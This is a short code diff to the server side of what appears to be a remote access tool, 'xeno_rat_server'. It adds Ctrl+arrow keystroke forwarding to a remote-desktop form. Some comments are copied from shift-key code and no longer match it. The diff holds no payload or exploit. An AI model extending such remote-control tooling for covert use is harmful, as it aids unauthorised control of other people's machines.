@@ -733,6 +733,13 @@ namespace xeno_rat_server.Forms
                 e.Handled = true;
                 return;
             }
+
+            if (ctrlDown && (actualKey == Keys.Up || actualKey == Keys.Down || actualKey == Keys.Left || actualKey == Keys.Right))
+            {
+                _ = SendControlledArrowKeyAsync(actualKey);
+                e.Handled = true;
+                return;
+            }
         }
 
         protected override bool IsInputKey(Keys keyData)
@@ -749,6 +756,20 @@ namespace xeno_rat_server.Forms
                 // Press Shift
                 await SendKeyStateShiftedArrowKeysAsync(arrowKey, 1); // KEY_DOWN       
                 await SendKeyStateShiftedArrowKeysAsync(arrowKey, 0); // KEY_DOWN
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"SendKeyAsync error: {ex.Message}");
+            }
+        }  
+
+        private async Task SendControlledArrowKeyAsync(Keys arrowKey)
+        {
+            try
+            {
+                // Press Shift
+                await SendKeyStateContorolledArrowKeysAsync(arrowKey, 1); // KEY_DOWN       
+                await SendKeyStateContorolledArrowKeysAsync(arrowKey, 0); // KEY_DOWN
             }
             catch (Exception ex)
             {
@@ -829,6 +850,24 @@ namespace xeno_rat_server.Forms
 
             // Packet header for type 15 (custom combo)
             byte[] header = new byte[] { 15 };
+
+            // Combine all arrays
+            byte[] packet = client.sock.Concat(header, shiftBytes);
+            packet = client.sock.Concat(packet, arrowBytes);
+
+            // Send packet
+            await client.SendAsync(packet);
+        }
+
+        private async Task SendKeyStateContorolledArrowKeysAsync(Keys key, int state, bool extended = false)
+        {
+            int keyValue = (int)key;
+
+            byte[] shiftBytes = client.sock.IntToBytes((int)Keys.ControlKey | (state << 16));
+            byte[] arrowBytes = client.sock.IntToBytes((int)key | (state << 16));
+
+            // Packet header for type 15 (custom combo)
+            byte[] header = new byte[] { 16 };
 
             // Combine all arrays
             byte[] packet = client.sock.Concat(header, shiftBytes);
